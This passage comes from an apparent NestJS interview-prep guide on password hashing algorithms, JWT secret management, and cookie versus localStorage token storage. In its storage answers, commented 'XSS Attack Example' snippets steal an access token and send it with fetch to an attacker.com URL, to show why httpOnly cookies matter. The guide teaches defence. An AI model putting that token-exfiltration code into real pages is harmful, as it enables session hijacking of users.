    'IcZiIJ.UHypX1UYqc3vO6KJz5/.h1y': 'Hash (31 characters)',
  },
};

// 9. Common Mistakes to Avoid
const bcryptMistakes = {
  ❌: [
    'Using too few rounds (< 10)',
    'Storing plaintext passwords',
    'Using MD5 or SHA1 (too fast)',
    'Hashing passwords on frontend',
    'Not using salt (bcrypt does automatically)',
  ],
  ✅: [
    'Use 10-12 rounds for production',
    'Always hash passwords on backend',
    'Use bcrypt.compare() for validation',
    'Hash passwords before saving to DB',
    'Never log passwords (plain or hashed)',
  ],
};

// 10. Complete Secure Implementation
export class SecureAuthService {
  constructor(
    @InjectRepository(User)
    private usersRepository: Repository<User>,
    private jwtService: JwtService,
  ) {}

  async register(email: string, password: string): Promise<{ access_token: string }> {
    // Check if user exists
    const existingUser = await this.usersRepository.findOne({ where: { email } });
    if (existingUser) {
      throw new ConflictException('User already exists');
    }

    // Create user (password will be hashed by @BeforeInsert)
    const user = this.usersRepository.create({ email, password });
    await this.usersRepository.save(user);

    // Generate JWT
    return this.login(user);
  }

  async login(user: User): Promise<{ access_token: string }> {
    const payload = { email: user.email, sub: user.id };
    return {
      access_token: this.jwtService.sign(payload),
    };
  }

  async validateUser(email: string, password: string): Promise<User> {
    const user = await this.usersRepository.findOne({ where: { email } });
    
    if (!user) {
      // Don't reveal if email exists
      throw new UnauthorizedException('Invalid credentials');
    }

    const isPasswordValid = await bcrypt.compare(password, user.password);
    
    if (!isPasswordValid) {
      throw new UnauthorizedException('Invalid credentials');
    }

    return user;
  }
}

// 11. Testing Bcrypt
describe('Bcrypt Hashing', () => {
  it('should hash password', async () => {
    const password = 'MyPassword123!';
    const hash = await bcrypt.hash(password, 10);
    
    expect(hash).not.toBe(password);
    expect(hash).toMatch(/^\$2b\$10\$/);
  });

  it('should validate correct password', async () => {
    const password = 'MyPassword123!';
    const hash = await bcrypt.hash(password, 10);
    
    const isValid = await bcrypt.compare(password, hash);
    expect(isValid).toBe(true);
  });

  it('should reject wrong password', async () => {
    const password = 'MyPassword123!';
    const hash = await bcrypt.hash(password, 10);
    
    const isValid = await bcrypt.compare('WrongPassword', hash);
    expect(isValid).toBe(false);
  });

  it('should generate different hashes for same password', async () => {
    const password = 'MyPassword123!';
    const hash1 = await bcrypt.hash(password, 10);
    const hash2 = await bcrypt.hash(password, 10);
    
    // Different hashes due to different salts
    expect(hash1).not.toBe(hash2);
    
    // But both should validate correctly
    expect(await bcrypt.compare(password, hash1)).toBe(true);
    expect(await bcrypt.compare(password, hash2)).toBe(true);
  });
});
```

**Interview Tip**: **Why bcrypt**: Slow by design (prevents brute-force), automatic salt, adaptive (can increase rounds over time). **Usage**: `bcrypt.hash(password, 10)` for hashing, `bcrypt.compare(plain, hash)` for validation. **Salt rounds**: 10-12 recommended (10 = ~100ms, 12 = ~300ms). **Security**: Never store plaintext, hash on backend (not frontend), use @BeforeInsert/@BeforeUpdate in Entity. **vs MD5/SHA1**: Bcrypt is intentionally slow (good for passwords), MD5/SHA1 are fast (bad for passwords). **Production**: 10-12 rounds, consider argon2 for highest security.

</details>

6. What is the difference between bcrypt, argon2, and scrypt?

<details>
<summary><strong>Answer</strong></summary>

**Password Hashing Algorithms**: **Bcrypt** (default, widely used, slow), **Argon2** (newest, most secure, winner of Password Hashing Competition 2015), **Scrypt** (memory-hard, resistant to hardware attacks). **Comparison**: Argon2 > Scrypt > Bcrypt in security, Bcrypt most compatible. **Recommendation**: Use **bcrypt** (proven) or **argon2** (best security). **Never use**: MD5, SHA1, SHA256 (too fast).

```typescript
// Password Hashing Algorithms Comparison

// 1. Bcrypt Implementation
import * as bcrypt from 'bcrypt';

export class BcryptService {
  async hash(password: string): Promise<string> {
    const saltRounds = 10; // Cost factor
    return bcrypt.hash(password, saltRounds);
  }

  async verify(password: string, hash: string): Promise<boolean> {
    return bcrypt.compare(password, hash);
  }
}

// Example usage
const bcryptService = new BcryptService();
const hash = await bcryptService.hash('MyPassword123!');
// Output: $2b$10$N9qo8uLOickgx2ZMRZoMye/IcZiIJ.UHypX1UYqc3vO6KJz5/.h1y

// 2. Argon2 Implementation
import * as argon2 from 'argon2';

export class Argon2Service {
  async hash(password: string): Promise<string> {
    return argon2.hash(password, {
      type: argon2.argon2id, // Hybrid (best)
      memoryCost: 2 ** 16,   // 64 MB
      timeCost: 3,           // Iterations
      parallelism: 1,        // Threads
    });
  }

  async verify(password: string, hash: string): Promise<boolean> {
    return argon2.verify(hash, password);
  }
}

// Example usage
const argon2Service = new Argon2Service();
const hash = await argon2Service.hash('MyPassword123!');
// Output: $argon2id$v=19$m=65536,t=3,p=1$...

// 3. Scrypt Implementation
import * as crypto from 'crypto';
import { promisify } from 'util';

const scryptAsync = promisify(crypto.scrypt);

export class ScryptService {
  async hash(password: string): Promise<string> {
    const salt = crypto.randomBytes(16).toString('hex');
    const buf = (await scryptAsync(password, salt, 64)) as Buffer;
    return `${buf.toString('hex')}.${salt}`;
  }

  async verify(password: string, hash: string): Promise<boolean> {
    const [hashedPassword, salt] = hash.split('.');
    const hashedPasswordBuf = Buffer.from(hashedPassword, 'hex');
    const suppliedPasswordBuf = (await scryptAsync(password, salt, 64)) as Buffer;
    return crypto.timingSafeEqual(hashedPasswordBuf, suppliedPasswordBuf);
  }
}

// 4. Algorithm Comparison Table
const hashingAlgorithmsComparison = {
  bcrypt: {
    year: '1999',
    security: 'Good',
    speed: 'Slow (intentional)',
    memoryUsage: 'Low (~4KB)',
    resistantTo: ['Brute force', 'Dictionary attacks'],
    vulnerable: ['GPU attacks (partial)'],
    costFactor: 'Rounds (2^rounds iterations)',
    recommended: true,
    use: 'General purpose, most compatible',
    pros: [
      'Widely adopted and battle-tested',
      'Built-in salt',
      'Adaptive (can increase rounds)',
      'Available in most languages',
    ],
    cons: [
      'Only uses 72 bytes of password',
      'Limited memory hardness',
      'Vulnerable to GPU acceleration',
    ],
  },
  argon2: {
    year: '2015',
    security: 'Excellent (Best)',
    speed: 'Configurable',
    memoryUsage: 'High (configurable, e.g., 64MB)',
    resistantTo: ['Brute force', 'GPU attacks', 'ASIC attacks', 'Side-channel'],
    vulnerable: [],
    costFactor: 'Memory + Time + Parallelism',
    recommended: true,
    use: 'High-security applications, new projects',
    pros: [
      'Winner of Password Hashing Competition 2015',
      'Memory-hard (resistant to GPU/ASIC)',
      'Three variants (argon2i, argon2d, argon2id)',
      'Configurable memory, time, parallelism',
    ],
    cons: [
      'Relatively new (less battle-tested)',
      'Not available in all languages',
      'Higher memory usage',
    ],
  },
  scrypt: {
    year: '2009',
    security: 'Very Good',
    speed: 'Slow (intentional)',
    memoryUsage: 'High (memory-hard)',
    resistantTo: ['Brute force', 'GPU attacks', 'ASIC attacks'],
    vulnerable: [],
    costFactor: 'CPU + Memory',
    recommended: true,
    use: 'When GPU resistance is critical',
    pros: [
      'Memory-hard (expensive for GPU/ASIC)',
      'Configurable CPU and memory costs',
      'Used by cryptocurrencies',
    ],
    cons: [
      'Complex to configure correctly',
      'Higher memory requirements',
      'Slower than bcrypt',
    ],
  },
  pbkdf2: {
    year: '2000',
    security: 'Good (if high iterations)',
    speed: 'Fast (need high iterations)',
    memoryUsage: 'Low',
    resistantTo: ['Brute force (with high iterations)'],
    vulnerable: ['GPU attacks', 'ASIC attacks'],
    costFactor: 'Iterations',
    recommended: false,
    use: 'Legacy systems only',
    pros: [
      'Standardized (NIST approved)',
      'Available everywhere',
    ],
    cons: [
      'Not memory-hard',
      'Vulnerable to GPU acceleration',
      'Requires very high iterations',
    ],
  },
  md5sha1sha256: {
    year: '1992/1995/2001',
    security: 'INSECURE',
    speed: 'Very fast (BAD for passwords)',
    memoryUsage: 'Very low',
    resistantTo: [],
    vulnerable: ['Everything'],
    costFactor: 'None',
    recommended: false,
    use: '❌ NEVER for passwords',
    pros: [],
    cons: [
      'Way too fast (billions of hashes/sec)',
      'Not designed for passwords',
      'No built-in salt',
      'Trivial to crack',
    ],
  },
};

// 5. Performance Comparison
async function benchmarkHashingAlgorithms() {
  const password = 'MySecurePassword123!';
  
  // Bcrypt (10 rounds)
  console.time('bcrypt');
  await bcrypt.hash(password, 10);
  console.timeEnd('bcrypt'); // ~100ms
  
  // Argon2 (default)
  console.time('argon2');
  await argon2.hash(password);
  console.timeEnd('argon2'); // ~300ms
  
  // Scrypt (N=16384)
  console.time('scrypt');
  await scryptAsync(password, crypto.randomBytes(16), 64);
  console.timeEnd('scrypt'); // ~200ms
}

// 6. Security Recommendations
const securityRecommendations = {
  newProjects: {
    first: 'Argon2id (best security)',
    second: 'Bcrypt (most compatible)',
    third: 'Scrypt (GPU-resistant)',
  },
  existingProjects: {
    ifBcrypt: 'Keep using bcrypt (it\'s fine)',
    ifMD5SHA: 'MIGRATE IMMEDIATELY to bcrypt/argon2',
  },
  configuration: {
    bcrypt: {
      rounds: 10-12,
      time: '~100-300ms per hash',
    },
    argon2: {
      memoryCost: '64 MB (2^16)',
      timeCost: '3 iterations',
      parallelism: '1 thread',
      type: 'argon2id (hybrid)',
    },
    scrypt: {
      N: '16384 (CPU cost)',
      r: '8 (block size)',
      p: '1 (parallelization)',
    },
  },
};

// 7. NestJS Implementation with Argon2
import { Injectable } from '@nestjs/common';
import * as argon2 from 'argon2';

@Injectable()
export class PasswordService {
  async hashPassword(password: string): Promise<string> {
    return argon2.hash(password, {
      type: argon2.argon2id,    // Hybrid (best of argon2i and argon2d)
      memoryCost: 2 ** 16,      // 64 MB
      timeCost: 3,              // 3 iterations
      parallelism: 1,           // 1 thread
    });
  }

  async verifyPassword(hash: string, password: string): Promise<boolean> {
    try {
      return await argon2.verify(hash, password);
    } catch (error) {
      return false;
    }
  }
}

// 8. User Entity with Argon2
import { Entity, Column, BeforeInsert, BeforeUpdate } from 'typeorm';
import * as argon2 from 'argon2';

@Entity('users')
export class User {
  @Column()
  password: string;

  @BeforeInsert()
  @BeforeUpdate()
  async hashPassword() {
    if (this.password && !this.password.startsWith('$argon2')) {
      this.password = await argon2.hash(this.password, {
        type: argon2.argon2id,
        memoryCost: 2 ** 16,
        timeCost: 3,
        parallelism: 1,
      });
    }
  }

  async validatePassword(password: string): Promise<boolean> {
    return argon2.verify(this.password, password);
  }
}

// 9. Migration Strategy (MD5 → Bcrypt/Argon2)
export class MigrationService {
  async migrateUser(user: User, plainPassword: string) {
    // User logs in with old MD5 password
    const md5Hash = crypto.createHash('md5').update(plainPassword).digest('hex');
    
    if (user.password === md5Hash) {
      // Rehash with argon2
      user.password = await argon2.hash(plainPassword);
      await this.usersRepository.save(user);
    }
  }
}

// 10. Quick Reference
const quickReference = {
  '🥇 Best Security': 'Argon2id',
  '🥈 Best Compatibility': 'Bcrypt',
  '🥉 Best GPU Resistance': 'Scrypt',
  '❌ Never Use': 'MD5, SHA1, SHA256 (for passwords)',
  
  installation: {
    bcrypt: 'npm install bcrypt',
    argon2: 'npm install argon2',
    scrypt: 'Built-in Node.js crypto module',
  },
};
```

**Interview Tip**: **Bcrypt** (1999): Battle-tested, widely adopted, ~100ms/hash, vulnerable to GPU. **Argon2** (2015): Password Hashing Competition winner, memory-hard (GPU/ASIC resistant), configurable, best security. **Scrypt** (2009): Memory-hard, GPU-resistant, used in crypto. **Recommendation**: New projects → Argon2id, Existing → Bcrypt OK, Never → MD5/SHA1/SHA256 (too fast). **Configuration**: Bcrypt 10-12 rounds, Argon2 64MB memory + 3 iterations. **Why slow**: Intentional to prevent brute-force attacks.

</details>
7. How do you securely store JWT secrets?

<details>
<summary><strong>Answer</strong></summary>

**JWT Secret Storage**: Store in **environment variables** (.env), **never hardcode** in source code. **Production**: Use **secret management services** (AWS Secrets Manager, HashiCorp Vault, Azure Key Vault). **Requirements**: Long (32+ characters), random, unique per environment. **Security**: Never commit to git, rotate regularly, use different secrets for access/refresh tokens.

```typescript
// Secure JWT Secret Management

// 1. Environment Variables (.env)
// .env (NEVER commit to git!)
JWT_SECRET=your-super-secret-jwt-key-min-32-chars-long-random-string-abc123xyz789
JWT_REFRESH_SECRET=different-secret-for-refresh-tokens-def456uvw012
JWT_EXPIRES_IN=15m
JWT_REFRESH_EXPIRES_IN=7d

// Generate strong random secrets (Node.js)
import * as crypto from 'crypto';

// Generate 256-bit (32-byte) random secret
const jwtSecret = crypto.randomBytes(32).toString('base64');
console.log(jwtSecret); // e.g., "8xK9mP2nQ5rS7tU4vW6yZ1aB3cD5eF7g..."

// 2. ConfigModule Setup
// config/configuration.ts
export default () => ({
  jwt: {
    secret: process.env.JWT_SECRET,
    refreshSecret: process.env.JWT_REFRESH_SECRET,
    expiresIn: process.env.JWT_EXPIRES_IN || '15m',
    refreshExpiresIn: process.env.JWT_REFRESH_EXPIRES_IN || '7d',
  },
});

// app.module.ts
import { Module } from '@nestjs/common';
import { ConfigModule } from '@nestjs/config';
import configuration from './config/configuration';

@Module({
  imports: [
    ConfigModule.forRoot({
      isGlobal: true,
      load: [configuration],
      envFilePath: `.env.${process.env.NODE_ENV}`, // .env.development, .env.production
    }),
  ],
})
export class AppModule {}

// 3. JwtModule Configuration
// auth.module.ts
import { Module } from '@nestjs/common';
import { JwtModule } from '@nestjs/jwt';
import { ConfigModule, ConfigService } from '@nestjs/config';

@Module({
  imports: [
    JwtModule.registerAsync({
      imports: [ConfigModule],
      useFactory: async (configService: ConfigService) => ({
        secret: configService.get<string>('JWT_SECRET'),
        signOptions: {
          expiresIn: configService.get<string>('JWT_EXPIRES_IN'),
        },
      }),
      inject: [ConfigService],
    }),
  ],
})
export class AuthModule {}

// 4. AWS Secrets Manager Integration
import { SecretsManagerClient, GetSecretValueCommand } from '@aws-sdk/client-secrets-manager';

export class AwsSecretsService {
  private client: SecretsManagerClient;

  constructor() {
    this.client = new SecretsManagerClient({ region: 'us-east-1' });
  }

  async getSecret(secretName: string): Promise<string> {
    const command = new GetSecretValueCommand({ SecretId: secretName });
    const response = await this.client.send(command);
    return response.SecretString;
  }
}

// Usage in ConfigService
export class ConfigService {
  private awsSecretsService = new AwsSecretsService();

  async getJwtSecret(): Promise<string> {
    if (process.env.NODE_ENV === 'production') {
      // Fetch from AWS Secrets Manager
      const secret = await this.awsSecretsService.getSecret('prod/jwt/secret');
      return JSON.parse(secret).JWT_SECRET;
    }
    // Development: Use .env
    return process.env.JWT_SECRET;
  }
}

// 5. HashiCorp Vault Integration
import * as vault from 'node-vault';

export class VaultService {
  private client;

  constructor() {
    this.client = vault({
      apiVersion: 'v1',
      endpoint: process.env.VAULT_ADDR,
      token: process.env.VAULT_TOKEN,
    });
  }

  async getSecret(path: string, key: string): Promise<string> {
    const result = await this.client.read(path);
    return result.data[key];
  }
}

// Usage
const vaultService = new VaultService();
const jwtSecret = await vaultService.getSecret('secret/jwt', 'secret');

// 6. Docker Secrets (Docker Swarm/Kubernetes)
// docker-compose.yml
/*
version: '3.8'
services:
  api:
    image: myapp
    secrets:
      - jwt_secret
secrets:
  jwt_secret:
    external: true
*/

// Read Docker secret
import * as fs from 'fs';

function getDockerSecret(secretName: string): string {
  try {
    return fs.readFileSync(`/run/secrets/${secretName}`, 'utf8').trim();
  } catch (error) {
    return process.env[secretName.toUpperCase()];
  }
}

const jwtSecret = getDockerSecret('jwt_secret');

// 7. Kubernetes Secrets
/*
apiVersion: v1
kind: Secret
metadata:
  name: jwt-secret
type: Opaque
data:
  JWT_SECRET: <base64-encoded-secret>
*/

// Mounted as environment variable or file
const jwtSecret = process.env.JWT_SECRET; // From Kubernetes Secret

// 8. Security Best Practices
const jwtSecretBestPractices = {
  generation: {
    ✅: [
      'Use crypto.randomBytes(32)',
      'Minimum 32 characters (256 bits)',
      'Base64 or hex encoding',
      'Unique per environment',
    ],
    ❌: [
      'Short secrets (< 32 chars)',
      'Dictionary words',
      'Same secret across environments',
      'Predictable patterns',
    ],
  },
  storage: {
    ✅: [
      'Environment variables (.env)',
      'Secret management services (AWS/Vault)',
      'Encrypted configuration',
      'Docker/Kubernetes secrets',
    ],
    ❌: [
      'Hardcoded in source code',
      'Committed to git',
      'Stored in plaintext files',
      'Shared via email/Slack',
    ],
  },
  rotation: {
    ✅: [
      'Rotate every 90 days',
      'Rotate after security incident',
      'Different secrets for access/refresh tokens',
      'Automated rotation with Vault',
    ],
    ❌: [
      'Never rotating secrets',
      'Same secret for years',
      'Manual rotation only',
    ],
  },
  environments: {
    development: 'Simple .env file',
    staging: 'Secret manager (test rotation)',
    production: 'AWS Secrets Manager / Vault',
  },
};

// 9. .gitignore Configuration
/*
# .gitignore
.env
.env.*
!.env.example
secrets/
*/

// .env.example (commit this)
/*
JWT_SECRET=your-secret-here
JWT_REFRESH_SECRET=your-refresh-secret-here
JWT_EXPIRES_IN=15m
JWT_REFRESH_EXPIRES_IN=7d
*/

// 10. Validation at Startup
// main.ts
import { NestFactory } from '@nestjs/core';
import { AppModule } from './app.module';

async function bootstrap() {
  // Validate required secrets exist
  const requiredEnvVars = ['JWT_SECRET', 'JWT_REFRESH_SECRET'];
  const missingEnvVars = requiredEnvVars.filter((envVar) => !process.env[envVar]);

  if (missingEnvVars.length > 0) {
    throw new Error(`Missing required environment variables: ${missingEnvVars.join(', ')}`);
  }

  // Validate secret strength
  if (process.env.JWT_SECRET.length < 32) {
    throw new Error('JWT_SECRET must be at least 32 characters');
  }

  const app = await NestFactory.create(AppModule);
  await app.listen(3000);
}
bootstrap();

// 11. Secret Rotation Strategy
export class JwtService {
  private currentSecret: string;
  private previousSecret: string; // For graceful rotation

  constructor(private configService: ConfigService) {
    this.currentSecret = configService.get('JWT_SECRET');
    this.previousSecret = configService.get('JWT_PREVIOUS_SECRET');
  }

  // Sign with current secret
  sign(payload: any): string {
    return jwt.sign(payload, this.currentSecret);
  }

  // Verify with current or previous secret (during rotation)
  verify(token: string): any {
    try {
      return jwt.verify(token, this.currentSecret);
    } catch (error) {
      if (this.previousSecret) {
        return jwt.verify(token, this.previousSecret);
      }
      throw error;
    }
  }
}

// 12. Production Checklist
const productionSecretChecklist = {
  '✅ Strong Secret': '32+ characters, random',
  '✅ Environment Variables': 'Not hardcoded',
  '✅ Secret Manager': 'AWS/Vault in production',
  '✅ Different per Environment': 'Dev ≠ Staging ≠ Prod',
  '✅ Not in Git': '.env in .gitignore',
  '✅ Separate Access/Refresh': 'Different secrets',
  '✅ Rotation Plan': 'Every 90 days',
  '✅ Validation': 'Check at startup',
  '❌ Never': 'Hardcode, commit to git, share via insecure channels',
};
```

**Interview Tip**: **Storage**: Environment variables (.env), never hardcode or commit to git. **Production**: AWS Secrets Manager, HashiCorp Vault, Azure Key Vault. **Generation**: `crypto.randomBytes(32).toString('base64')` - minimum 32 chars, random. **Best practices**: Unique per environment (dev/staging/prod different), separate secrets for access/refresh tokens, rotate every 90 days, validate at startup. **Docker**: Use Docker/Kubernetes secrets. **Security**: Add .env to .gitignore, use .env.example for template, check secret length >= 32 chars.

</details>

8. Should JWT tokens be stored in localStorage or cookies?

<details>
<summary><strong>Answer</strong></summary>

**Token Storage**: **Cookies** (httpOnly + Secure + SameSite) are **more secure** than localStorage. **Why**: Cookies with httpOnly flag protect against XSS attacks (JavaScript can't access), localStorage vulnerable to XSS. **Best**: httpOnly cookies for web apps, Authorization header for mobile/SPA. **Tradeoffs**: Cookies need CSRF protection, localStorage easier but less secure.

```typescript
// JWT Token Storage: Cookies vs localStorage

// 1. localStorage Storage (Less Secure)
// ❌ VULNERABLE TO XSS ATTACKS
// Frontend (React/Angular/Vue)
/*
// Login
const response = await fetch('/api/auth/login', {
  method: 'POST',
  body: JSON.stringify({ email, password }),
});
const { access_token } = await response.json();

// Store in localStorage
localStorage.setItem('access_token', access_token); // ❌ XSS can steal this

// Use token
fetch('/api/protected', {
  headers: {
    'Authorization': `Bearer ${localStorage.getItem('access_token')}`,
  },
});

// XSS Attack Example
<script>
  // Malicious script can steal token
  const token = localStorage.getItem('access_token');
  fetch('https://attacker.com/steal?token=' + token);
</script>
*/

// 2. httpOnly Cookies Storage (More Secure)
// ✅ PROTECTED FROM XSS
// Backend (NestJS)
import { Controller, Post, Res, Body } from '@nestjs/common';
import { Response } from 'express';

@Controller('auth')
export class AuthController {
  @Post('login')
  async login(
    @Body() loginDto: LoginDto,
    @Res({ passthrough: true }) response: Response,
  ) {
    const user = await this.authService.validateUser(loginDto.email, loginDto.password);
    const { access_token, refresh_token } = await this.authService.login(user);

    // Set httpOnly cookie (JavaScript cannot access)
    response.cookie('access_token', access_token, {
      httpOnly: true,        // ✅ Prevents XSS access
      secure: true,          // ✅ HTTPS only
      sameSite: 'strict',    // ✅ Prevents CSRF
      maxAge: 15 * 60 * 1000, // 15 minutes
    });

    response.cookie('refresh_token', refresh_token, {
      httpOnly: true,
      secure: true,
      sameSite: 'strict',
      maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
    });

    return { message: 'Logged in successfully' };
  }

  @Post('logout')
  logout(@Res({ passthrough: true }) response: Response) {
    response.clearCookie('access_token');
    response.clearCookie('refresh_token');
    return { message: 'Logged out successfully' };
  }
}

// Frontend (React/Angular/Vue)
/*
// Login (no manual token handling)
await fetch('/api/auth/login', {
  method: 'POST',
  credentials: 'include', // Send cookies
  body: JSON.stringify({ email, password }),
});

// Use protected endpoint (cookies sent automatically)
fetch('/api/protected', {
  credentials: 'include', // Include cookies
});

// XSS Attack Example (FAILS)
<script>
  // Cannot access httpOnly cookie!
  console.log(document.cookie); // Won't show httpOnly cookies
</script>
*/

// 3. JWT Strategy with Cookies
import { Injectable } from '@nestjs/common';
import { PassportStrategy } from '@nestjs/passport';
import { Strategy } from 'passport-jwt';
import { Request } from 'express';

@Injectable()
export class JwtCookieStrategy extends PassportStrategy(Strategy, 'jwt-cookie') {
  constructor() {
    super({
      jwtFromRequest: (req: Request) => {
        // Extract JWT from cookie
        return req?.cookies?.access_token;
      },
      ignoreExpiration: false,
      secretOrKey: process.env.JWT_SECRET,
    });
  }

  async validate(payload: any) {
    return { userId: payload.sub, email: payload.email };
  }
}

// 4. CORS Configuration for Cookies
// main.ts
import { NestFactory } from '@nestjs/core';
import * as cookieParser from 'cookie-parser';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);

  // Enable cookie parser
  app.use(cookieParser());

  // CORS with credentials
  app.enableCors({
    origin: 'http://localhost:3001', // Frontend URL
    credentials: true, // Allow cookies
  });

  await app.listen(3000);
}
bootstrap();

// 5. Comparison Table
const storageComparison = {
  httpOnlyCookies: {
    security: '✅ Secure (XSS protected)',
    xssProtection: '✅ JavaScript cannot access',
    csrfProtection: '❌ Needs CSRF tokens',
    storageLimit: '4KB per cookie',
    accessibility: 'Server and browser (not JS)',
    bestFor: 'Web applications',
    implementation: 'response.cookie()',
    pros: [
      'Protected from XSS attacks',
      'Automatic with requests (no manual header)',
      'Can set expiration',
      'Secure flag for HTTPS',
    ],
    cons: [
      'Needs CSRF protection',
      'Not accessible to JavaScript',
      'Size limit (4KB)',
      'Domain restrictions',
    ],
  },
  localStorage: {
    security: '❌ Vulnerable to XSS',
    xssProtection: '❌ JavaScript can access',
    csrfProtection: '✅ Not vulnerable to CSRF',
    storageLimit: '5-10MB',
    accessibility: 'JavaScript only',
    bestFor: 'SPAs with strict CSP',
    implementation: 'localStorage.setItem()',
    pros: [
      'Easy to implement',
      'Accessible to JavaScript',
      'Larger storage (5-10MB)',
      'No CSRF concerns',
    ],
    cons: [
      'Vulnerable to XSS attacks',
      'Any script can steal token',
      'Persists until explicitly cleared',
      'Synchronous API',
    ],
  },
  sessionStorage: {
    security: '❌ Vulnerable to XSS',
    xssProtection: '❌ JavaScript can access',
    csrfProtection: '✅ Not vulnerable to CSRF',
    storageLimit: '5-10MB',
    accessibility: 'JavaScript only',
    bestFor: 'Short-lived sessions',
    implementation: 'sessionStorage.setItem()',
    pros: [
      'Cleared on tab close',
      'Per-tab isolation',
      'Larger storage',
    ],
    cons: [
      'Vulnerable to XSS',
      'Lost on tab close',
      'Synchronous API',
    ],
  },
  authorizationHeader: {
    security: '⚠️ Depends on storage',
    xssProtection: '⚠️ If token in localStorage',
    csrfProtection: '✅ Not vulnerable',
    storageLimit: 'N/A',
    accessibility: 'Manual',
    bestFor: 'Mobile apps, APIs',
    implementation: 'Bearer token in header',
    pros: [
      'Explicit control',
      'Works cross-domain',
      'Standard for APIs',
      'No cookie restrictions',
    ],
    cons: [
      'Manual header management',
      'Token still needs storage',
      'Verbose',
    ],
  },
};

// 6. Recommended Approaches
const recommendedApproaches = {
  webApp: {
    storage: 'httpOnly cookies',
    csrf: 'CSRF tokens (csurf middleware)',
    example: 'Traditional server-rendered + SPA',
  },
  spa: {
    storage: 'httpOnly cookies + Authorization header',
    csrf: 'CSRF tokens for cookies',
    example: 'React/Angular/Vue SPA',
  },
  mobileApp: {
    storage: 'Secure storage (Keychain/Keystore)',
    csrf: 'Not applicable',
    example: 'React Native / Flutter',
  },
  api: {
    storage: 'N/A (client manages)',
    csrf: 'Not applicable',
    example: 'RESTful API for third parties',
  },
};

// 7. Secure Cookie Configuration
const secureCookieConfig = {
  httpOnly: true,      // ✅ Prevent XSS access
  secure: true,        // ✅ HTTPS only
  sameSite: 'strict',  // ✅ Prevent CSRF
  domain: '.example.com', // Subdomain sharing
  path: '/',           // Available on all paths
  maxAge: 15 * 60 * 1000, // 15 minutes
};

// 8. CSRF Protection (When Using Cookies)
// Install: npm install csurf
import * as csurf from 'csurf';

// main.ts
app.use(csurf({ cookie: true }));

// Get CSRF token
@Get('csrf-token')
getCsrfToken(@Req() req) {
  return { csrfToken: req.csrfToken() };
}

// Frontend includes CSRF token
/*
const csrfToken = await fetch('/api/csrf-token').then(r => r.json());
fetch('/api/protected', {
  method: 'POST',
  headers: { 'CSRF-Token': csrfToken },
  credentials: 'include',
});
*/

// 9. Hybrid Approach (Best of Both)
@Controller('auth')
export class AuthController {
  @Post('login')
  async login(@Body() loginDto: LoginDto, @Res({ passthrough: true }) res: Response) {
    const { access_token, refresh_token } = await this.authService.login(user);

    // httpOnly cookie for web
    res.cookie('access_token', access_token, {
      httpOnly: true,
      secure: true,
      sameSite: 'strict',
    });

    // Also return in body for mobile apps
    return {
      access_token,
      refresh_token,
      expiresIn: 900, // 15 minutes
    };
  }
}

// 10. Security Decision Tree
const decisionTree = {
  question: 'What type of application?',
  webApp: {
    answer: 'Use httpOnly cookies',
    csrf: 'Yes, implement CSRF protection',
    xss: 'Protected',
  },
  mobileApp: {
    answer: 'Use Authorization header',
    csrf: 'No',
    xss: 'Store in secure storage (Keychain)',
  },
  api: {
    answer: 'Client decides',
    csrf: 'No (stateless)',
    xss: 'Client responsibility',
  },
};
```

**Interview Tip**: **Cookies (httpOnly + Secure + SameSite)** are more secure than localStorage. **Why**: httpOnly prevents XSS access (JavaScript can't read), Secure ensures HTTPS only, SameSite prevents CSRF. **localStorage**: Vulnerable to XSS (any script can steal token). **Best for web**: httpOnly cookies + CSRF protection. **Best for mobile**: Authorization header + secure storage (Keychain/Keystore). **Tradeoff**: Cookies need CSRF tokens, localStorage easier but less secure. **Production**: Use httpOnly cookies for web, validate origin, implement CSRF protection.

</details>
9. What is httpOnly cookie and why is it secure?

<details>
<summary><strong>Answer</strong></summary>

**httpOnly Cookie**: Cookie with **httpOnly flag = true** prevents **JavaScript** from accessing it via `document.cookie`. **Security**: Protects against **XSS attacks** (malicious scripts can't steal tokens). **Use**: Store JWT access/refresh tokens in httpOnly cookies. **Tradeoff**: Can't be read by frontend JS, but sent automatically with requests. **Production**: Always use httpOnly for sensitive data.

```typescript
// httpOnly Cookie - Complete Guide

// 1. What is httpOnly?
const cookieDefinition = {
  httpOnly: true,  // Cookie cannot be accessed via JavaScript
  purpose: 'Prevent XSS attacks from stealing tokens',
  accessibility: {
    server: '✅ Can read/write',
    browser: '✅ Can send with requests',
    javascript: '❌ Cannot access via document.cookie',
  },
};

// 2. Setting httpOnly Cookie in NestJS
import { Controller, Post, Res } from '@nestjs/common';
import { Response } from 'express';

@Controller('auth')
export class AuthController {
  @Post('login')
  async login(
    @Body() loginDto: LoginDto,
    @Res({ passthrough: true }) response: Response,
  ) {
    const { access_token } = await this.authService.login(loginDto);

    // Set httpOnly cookie
    response.cookie('access_token', access_token, {
      httpOnly: true,        // ✅ JavaScript cannot access
      secure: true,          // Only HTTPS
      sameSite: 'strict',    // CSRF protection
      maxAge: 15 * 60 * 1000, // 15 minutes
    });

    return { message: 'Logged in successfully' };
  }
}

// 3. Without httpOnly (VULNERABLE)
// ❌ Regular cookie (accessible to JavaScript)
response.cookie('access_token', access_token, {
  httpOnly: false, // or omitted
});

// Frontend can access (BAD for sensitive data)
/*
<script>
  const token = document.cookie
    .split('; ')
    .find(row => row.startsWith('access_token='))
    .split('=')[1];
  
  // XSS attack can steal token
  fetch('https://attacker.com/steal?token=' + token);
</script>
*/

// 4. With httpOnly (SECURE)
// ✅ httpOnly cookie (protected from JavaScript)
response.cookie('access_token', access_token, {
  httpOnly: true, // JavaScript cannot access
});

// Frontend CANNOT access
/*
<script>
  console.log(document.cookie); // Won't show httpOnly cookies
  // "other_cookie=value" (only non-httpOnly cookies)
</script>
*/

// But cookies are sent automatically with requests
/*
fetch('/api/protected', {
  credentials: 'include', // Includes httpOnly cookies
});
*/

// 5. Reading httpOnly Cookies (Server-Side)
import { Controller, Get, Req } from '@nestjs/common';
import { Request } from 'express';

@Controller('profile')
export class ProfileController {
  @Get()
  getProfile(@Req() request: Request) {
    // Server can read httpOnly cookie
    const accessToken = request.cookies['access_token'];
    return { token: accessToken };
  }
}

// 6. JWT Strategy with httpOnly Cookies
import { Injectable } from '@nestjs/common';
import { PassportStrategy } from '@nestjs/passport';
import { Strategy } from 'passport-jwt';

@Injectable()
export class JwtCookieStrategy extends PassportStrategy(Strategy) {
  constructor() {
    super({
      jwtFromRequest: (req) => {
        // Extract JWT from httpOnly cookie
